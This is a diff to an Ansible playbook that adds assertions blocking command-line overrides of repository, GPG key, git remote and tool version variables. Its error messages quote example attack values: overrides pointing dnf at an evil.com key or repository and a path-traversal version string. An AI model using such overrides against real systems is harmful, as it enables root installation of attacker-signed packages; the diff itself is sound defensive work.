@@ -2543,6 +2543,104 @@
               Current value: '{{ notes_repo_path | default("") }}'.
           tags: [always]
 
+        - name: Assert repos_dnf_redhat_gpgkey in play namespace targets trusted domain (-e override guard)
+          ansible.builtin.assert:
+            that:
+              - >-
+                (repos_dnf_redhat_gpgkey | default('') | length == 0) or
+                (repos_dnf_redhat_gpgkey | default('') is match('^https://(pkgs\.devel|repo|keys)\.redhat\.com/.*\.gpg$'))
+            fail_msg: >-
+              SECURITY: repos_dnf_redhat_gpgkey in the play namespace must target a known Red Hat
+              internal domain (pkgs.devel.redhat.com, repo.redhat.com, or keys.redhat.com) or be
+              unset. This catches -e override attacks that bypass the file-based config.yml check.
+              An attacker passing -e repos_dnf_redhat_gpgkey=https://evil.com/key.gpg causes dnf
+              to fetch the attacker-controlled GPG key and trust it to verify packages from
+              repos_dnf_redhat_baseurl, enabling signed-malware installation as root.
+              Allowed format: https://(pkgs.devel|repo|keys).redhat.com/<path>/<file>.gpg
+              Current value: '{{ repos_dnf_redhat_gpgkey | default("") }}'.
+          tags: [always]
+
+        - name: Assert repos_dnf_acli_baseurl in play namespace targets trusted domain (-e override guard)
+          ansible.builtin.assert:
+            that:
+              - >-
+                (repos_dnf_acli_baseurl | default('') | length == 0) or
+                (repos_dnf_acli_baseurl | default('') is match('^https://[a-zA-Z0-9._-]+\.redhat\.com/.*'))
+            fail_msg: >-
+              SECURITY: repos_dnf_acli_baseurl in the play namespace must be an internal Red Hat
+              URL (https://<subdomain>.redhat.com/<path>) or be unset. This catches -e override
+              attacks that bypass the file-based config.yml check. An attacker passing
+              -e repos_dnf_acli_baseurl=https://evil.com/repo causes dnf to install packages
+              from an untrusted source even with gpgcheck enabled (attacker controls the signing key).
+              Allowed format: https://<subdomain>.redhat.com/<path>
+              Current value: '{{ repos_dnf_acli_baseurl | default("") }}'.
+          tags: [always]
+
+        - name: Assert notes_remote_url and notes_remote_url_https in play namespace are valid git URLs (-e override guard)
+          ansible.builtin.assert:
+            that:
+              - >-
+                (notes_remote_url | default('') | length == 0) or
+                (notes_remote_url | default('') is match('^git@[a-zA-Z0-9._-]+:[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+\.git$'))
+              - >-
+                (notes_remote_url_https | default('') | length == 0) or
+                (notes_remote_url_https | default('') is match('^https://[a-zA-Z0-9._-]+/[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+\.git$'))
+            fail_msg: >-
+              SECURITY: notes_remote_url or notes_remote_url_https in the play namespace contains
+              an invalid or malicious URL (possibly set via -e flag, bypassing config.yml check).
+              These are passed directly to ansible.builtin.git; path traversal sequences ('..') can
+              escape the notes_repo_name validation and clone arbitrary repositories.
+              Allowed: notes_remote_url must match git@host:user/repo.git;
+              notes_remote_url_https must match https://host/user/repo.git.
+              Current: notes_remote_url='{{ notes_remote_url | default("") }}',
+              notes_remote_url_https='{{ notes_remote_url_https | default("") }}'.
+          tags: [always]
+
+        - name: Assert binary version vars in play namespace match semver format (-e override guard)
+          vars:
+            _semver_pattern: '^[0-9]+(\.[0-9]+)*(-[a-zA-Z0-9]+)?$'
+            _version_vals_ns:
+              - "{{ packages_kind_version | default('') | string }}"
+              - "{{ packages_helm_version | default('') | string }}"
+              - "{{ packages_kustomize_version | default('') | string }}"
+              - "{{ packages_k9s_version | default('') | string }}"
+              - "{{ packages_transcrypt_version | default('') | string }}"
+              - "{{ packages_sops_version | default('') | string }}"
+              - "{{ packages_gitleaks_version | default('') | string }}"
+              - "{{ packages_actionlint_version | default('') | string }}"
+              - "{{ packages_zizmor_version | default('') | string }}"
+              - "{{ packages_operator_sdk_version | default('') | string }}"
+              - "{{ packages_cosign_version | default('') | string }}"
+              - "{{ packages_tkn_version | default('') | string }}"
+              - "{{ packages_ec_version | default('') | string }}"
+              - "{{ packages_oc_version | default('') | string }}"
+              - "{{ packages_yamllint_version | default('') | string }}"
+              - "{{ packages_ansible_lint_version | default('') | string }}"
+              - "{{ packages_golangci_lint_version | default('') | string }}"
+              - "{{ packages_gofumpt_version | default('') | string }}"
+              - "{{ packages_govulncheck_version | default('') | string }}"
+              - "{{ packages_gci_version | default('') | string }}"
+              - "{{ packages_gopls_version | default('') | string }}"
+              - "{{ packages_controller_gen_version | default('') | string }}"
+              - "{{ packages_stern_version | default('') | string }}"
+              - "{{ packages_code_generator_version | default('') | string }}"
+              - "{{ packages_subctl_version | default('') | string }}"
+              - "{{ packages_aerospace_version | default('') | string }}"
+              - "{{ packages_krew_bootstrap_version | default('') | string }}"
+              - "{{ packages_krew_plugin_ctx_version | default('') | string }}"
+              - "{{ packages_krew_plugin_ns_version | default('') | string }}"
+          ansible.builtin.assert:
+            that:
+              - _version_vals_ns | select() | reject('match', _semver_pattern) | list | length == 0
+            fail_msg: >-
+              SECURITY: One or more binary version variables in the play namespace do not match
+              semantic versioning format (possibly set via -e flag, bypassing config.yml check).
+              Version strings are interpolated directly into download URLs; a value like
+              "0.32.0/../../evil" performs URL path traversal to access unintended server paths.
+              Allowed: ^[0-9]+(\.[0-9]+)*(-[a-zA-Z0-9]+)?$ (e.g. "1.2.3", "0.32.0-rc1")
+              Invalid values: {{ _version_vals_ns | select() | reject('match', _semver_pattern) | list }}.
+          tags: [always]
+
         - name: Set namespace validation flag (internal, cannot be pre-set)
           ansible.builtin.set_fact:
             _pf_namespace_validated_internal: "{{ ansible_date_time.iso8601 }}"
